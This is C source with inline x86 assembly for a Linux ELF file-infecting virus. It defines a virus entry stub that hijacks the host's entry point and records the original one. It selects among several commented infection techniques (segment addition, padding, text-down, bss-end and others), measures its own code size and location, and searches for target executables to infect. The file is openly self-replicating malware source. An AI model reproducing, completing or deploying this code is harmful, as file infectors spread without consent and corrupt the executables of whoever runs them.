#include <stdio.h>
#include <unistd.h>
#include <linux/types.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>

typedef struct {
	int size;
	void *self;
} globals;
register globals *g asm("ebp");
extern void virus_start;
static void virus_end(void);

asm(	".globl fake_host; fake_host: mov $1, %eax; int $0x80");
asm(	".globl virus_start; virus_start:\n"
	"pusha; call virus; popa; .byte 0xe9; .long fake_host - . - 4");

#include "../h/syscalls.h"
#include "../h/infect.h"
#include "../h/strings.c"

INFECT_INIT
	uint32_t old_entry = ehdr->e_entry;
//#include "infect-addseg.c"	/* OK */
//#include "infect-padding.c"	/* OK */
//#include "infect-dataend.c"	/* OK */
//#include "infect-replace.c"	/* OK */
//#include "infect-textdown.c"	/* OK */
//#include "infect-bssend.c"	/* OK */
#include "infect-glue.c"
INFECT_FINI

#include "../h/search.c"

void virus(uint32_t esp)
{
	/* determine our own size and location in memory, init globals */
	globals glob;
	g = &glob;
	g->size = (uint32_t)&virus_end - (uint32_t)&virus_start;
	g->self = (void*)__builtin_return_address(0) - 6;
	/* do our job */
	search(NULL);
#include "virus_clean_itself.c"
}

static void virus_end(void){};
